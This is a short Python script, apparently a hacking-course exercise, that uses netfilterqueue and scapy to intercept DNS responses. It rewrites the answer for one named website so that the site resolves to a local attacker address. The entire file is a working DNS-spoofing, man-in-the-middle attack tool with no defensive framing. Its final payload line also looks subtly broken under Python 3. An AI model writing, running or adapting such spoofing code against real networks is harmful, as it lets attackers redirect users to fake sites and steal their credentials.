#! /usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from urllib.parse import urlparse

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()  # Ensure qname is a string
        hostname = urlparse(f"http://{qname}").hostname  # Parse the hostname
        if hostname == "www.dapthecontract.com":
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.10.128")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
